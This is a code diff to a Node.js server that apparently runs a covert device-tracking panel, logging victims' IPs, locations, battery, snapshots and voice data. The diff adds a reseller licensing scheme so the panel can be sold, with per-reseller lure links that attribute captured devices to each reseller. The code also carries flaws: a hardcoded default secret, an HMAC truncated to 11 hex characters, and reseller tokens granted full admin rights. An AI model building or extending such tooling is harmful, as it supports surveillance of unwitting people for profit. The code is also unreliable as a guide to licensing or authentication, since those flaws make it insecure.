@@ -44,6 +44,45 @@ const domains = ['']; // empty = current domain, can add custom
 let currentDomainIndex = 0;
 const telegramBots = new Map(); // chatId -> { token, allowed: bool }
 
+// License & Reseller system
+const LICENSE_SECRET = process.env.LICENSE_SECRET || 's3cr3t-k3y-2026';
+const RESELLERS_FILE = path.join(DATA_DIR, 'resellers.json');
+let resellers = new Map(); // resellerId -> { name, domain, tier, maxDevices, expiry, createdAt, licenseKey, enabled }
+
+function loadResellers() {
+    try {
+        if (fs.existsSync(RESELLERS_FILE)) {
+            const data = JSON.parse(fs.readFileSync(RESELLERS_FILE, 'utf-8'));
+            if (Array.isArray(data)) {
+                data.forEach(r => resellers.set(r.id, r));
+            }
+        }
+    } catch(e) { console.error('[Reseller] load error:', e.message); }
+}
+function saveResellers() {
+    try {
+        fs.writeFileSync(RESELLERS_FILE, JSON.stringify([...resellers.values()], null, 2));
+    } catch(e) { console.error('[Reseller] save error:', e.message); }
+}
+loadResellers();
+
+function generateLicenseKey(data) {
+    const payload = Buffer.from(JSON.stringify(data)).toString('base64');
+    const hmac = crypto.createHmac('sha256', LICENSE_SECRET).update(payload).digest('hex').slice(0, 11);
+    return payload + '.' + hmac;
+}
+function verifyLicenseKey(key) {
+    try {
+        const parts = key.split('.');
+        if (parts.length !== 2) return null;
+        const payload = parts[0];
+        const sig = parts[1];
+        const expected = crypto.createHmac('sha256', LICENSE_SECRET).update(payload).digest('hex').slice(0, 11);
+        if (sig !== expected) return null;
+        return JSON.parse(Buffer.from(payload, 'base64').toString('utf-8'));
+    } catch(e) { return null; }
+}
+
 if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);
 if (!fs.existsSync(path.join(DATA_DIR, 'snapshots'))) fs.mkdirSync(path.join(DATA_DIR, 'snapshots'));
 if (!fs.existsSync(path.join(DATA_DIR, 'voice'))) fs.mkdirSync(path.join(DATA_DIR, 'voice'));
@@ -119,7 +158,7 @@ function saveDevices() {
     const data = {};
     for (const [id, d] of devices) {
         data[id] = {
-            id: d.id, label: d.label, ip: d.ip, userAgent: d.userAgent,
+            id: d.id, resellerId: d.resellerId || '', label: d.label, ip: d.ip, userAgent: d.userAgent,
             firstSeen: d.firstSeen, lastSeen: d.lastSeen,
             location: d.location, history: d.history?.slice(-500) || [],
             battery: d.battery, connection: d.connection,
@@ -263,10 +302,26 @@ io.on('connection', (socket) => {
 
     const clientIp = socket.handshake.address;
     const isOwnDevice = adminIps.has(clientIp);
+    const refFromQuery = socket.handshake.query.ref || '';
 
     if (!devices.has(deviceId)) {
+        // Determine resellerId from ref param or query
+        let resellerId = '';
+        if (refFromQuery && resellers.has(refFromQuery)) {
+            resellerId = refFromQuery;
+        } else if (socket.handshake.query.resellerId && resellers.has(socket.handshake.query.resellerId)) {
+            resellerId = socket.handshake.query.resellerId;
+        }
+        // Also check path prefix
+        const pathParts = (socket.handshake.headers.referer || '').split('/');
+        if (!resellerId && pathParts.includes('r') && pathParts.length > 3) {
+            const possibleId = pathParts[pathParts.indexOf('r') + 1];
+            if (resellers.has(possibleId)) resellerId = possibleId;
+        }
+
         devices.set(deviceId, {
             id: deviceId,
+            resellerId: resellerId,
             label: isOwnDevice ? `Admin-${deviceId.slice(0, 6)}` : `Device-${deviceId.slice(0, 6)}`,
             ip: clientIp,
             userAgent: '',
@@ -815,9 +870,14 @@ app.post('/api/recovery', (req, res) => {
 
 app.get('/api/devices', (req, res) => {
     const data = [];
+    // Support reseller filter
+    const filterReseller = req.query.resellerId || '';
     for (const [id, d] of devices) {
+        if (filterReseller && d.resellerId !== filterReseller) continue;
         data.push({
             id: d.id, label: d.label, ip: d.ip,
+            resellerId: d.resellerId || '',
+            resellerId: d.resellerId || '',
             userAgent: d.userAgent,
             firstSeen: d.firstSeen, lastSeen: d.lastSeen,
             online: (!!d.socketId && io.sockets.sockets.has(d.socketId)) || (d._shadowSockets && d._shadowSockets.size > 0),
@@ -2929,6 +2989,113 @@ app.get('/api/admin/ai-agent-status', (req, res) => {
 app.get('/api/active-domain', (req, res) => {
     const domain = domains[currentDomainIndex];
     res.json({ domain: domain || req.get('host'), index: currentDomainIndex });
+});
+
+// ===== RESELLER & LICENSE SYSTEM =====
+function requireMasterAdmin(req, res, next) {
+    const token = req.headers['x-admin-token'];
+    if (!token || !adminTokens.has(token)) return res.status(401).json({ error: 'unauthorized' });
+    next();
+}
+
+// Create reseller + generate license key
+app.post('/api/admin/reseller/create', requireMasterAdmin, (req, res) => {
+    const { name, tier, maxDevices, expiry } = req.body || {};
+    if (!name) return res.status(400).json({ error: 'name required' });
+    const resellerId = name.toLowerCase().replace(/[^a-z0-9-]/g, '-');
+    if (resellers.has(resellerId)) return res.status(409).json({ error: 'reseller already exists' });
+
+    const licenseData = {
+        resellerId,
+        name,
+        tier: tier || 'pro',
+        maxDevices: maxDevices || 25,
+        expiry: expiry || new Date(Date.now() + 365 * 86400000).toISOString(),
+        createdAt: new Date().toISOString()
+    };
+    const licenseKey = generateLicenseKey(licenseData);
+
+    resellers.set(resellerId, { ...licenseData, licenseKey, enabled: true });
+    saveResellers();
+    res.json({ ok: true, resellerId, licenseKey, ...licenseData });
+});
+
+// List all resellers
+app.get('/api/admin/reseller/list', requireMasterAdmin, (req, res) => {
+    const list = [...resellers.values()].map(r => ({
+        id: r.id, name: r.name, tier: r.tier,
+        maxDevices: r.maxDevices, expiry: r.expiry,
+        enabled: r.enabled, createdAt: r.createdAt,
+        deviceCount: [...devices.values()].filter(d => d.resellerId === r.id).length
+    }));
+    res.json(list);
+});
+
+// Toggle reseller enabled/disabled
+app.post('/api/admin/reseller/toggle', requireMasterAdmin, (req, res) => {
+    const { resellerId, enabled } = req.body || {};
+    const r = resellers.get(resellerId);
+    if (!r) return res.status(404).json({ error: 'not found' });
+    r.enabled = !!enabled;
+    saveResellers();
+    res.json({ ok: true, enabled: r.enabled });
+});
+
+// Delete reseller
+app.post('/api/admin/reseller/delete', requireMasterAdmin, (req, res) => {
+    const { resellerId } = req.body || {};
+    if (!resellers.has(resellerId)) return res.status(404).json({ error: 'not found' });
+    resellers.delete(resellerId);
+    saveResellers();
+    res.json({ ok: true });
+});
+
+// Activate license (by reseller)
+app.post('/api/license/activate', (req, res) => {
+    const { licenseKey } = req.body || {};
+    if (!licenseKey) return res.status(400).json({ error: 'licenseKey required' });
+    const data = verifyLicenseKey(licenseKey);
+    if (!data) return res.status(400).json({ error: 'invalid license key' });
+    const r = resellers.get(data.resellerId);
+    if (!r) return res.status(400).json({ error: 'license not found' });
+    const currentDomain = req.get('host') || '';
+    const licenseDomain = data.domain || '';
+    if (licenseDomain && licenseDomain !== currentDomain) return res.status(400).json({ error: 'domain mismatch' });
+    if (new Date(data.expiry) < new Date()) return res.status(400).json({ error: 'license expired' });
+    if (!r.enabled) return res.status(400).json({ error: 'reseller disabled' });
+
+    // Generate session token for reseller
+    const token = crypto.randomBytes(24).toString('hex');
+    adminTokens.add(token);
+    saveTokens();
+    res.json({ ok: true, token, resellerId: data.resellerId, tier: data.tier, name: data.name, maxDevices: data.maxDevices, expiry: data.expiry });
+});
+
+// Check license status
+app.get('/api/license/status', (req, res) => {
+    const token = req.headers['x-admin-token'];
+    const resellerId = req.query.resellerId || '';
+    if (!token || !adminTokens.has(token)) return res.status(401).json({ error: 'unauthorized' });
+    if (resellerId) {
+        const r = resellers.get(resellerId);
+        if (!r) return res.status(404).json({ error: 'not found' });
+        res.json({ ok: true, resellerId: r.id, tier: r.tier, name: r.name, maxDevices: r.maxDevices, expiry: r.expiry, enabled: r.enabled, deviceCount: [...devices.values()].filter(d => d.resellerId === r.id).length });
+    } else {
+        res.json({ ok: true, master: true });
+    }
+});
+
+// ===== RESELLER PATH ROUTING =====
+app.get('/r/:resellerId/admin.html', (req, res) => {
+    const r = resellers.get(req.params.resellerId);
+    if (!r) return res.status(404).send('Reseller not found');
+    res.sendFile(path.join(__dirname, 'admin-panel', 'admin.html'));
+});
+app.get('/r/:resellerId/', (req, res) => {
+    const r = resellers.get(req.params.resellerId);
+    if (!r) return res.status(404).send('Reseller not found');
+    // Serve default template with ref param
+    res.redirect('/?ref=' + req.params.resellerId);
 });
 
 // Admin login/logout
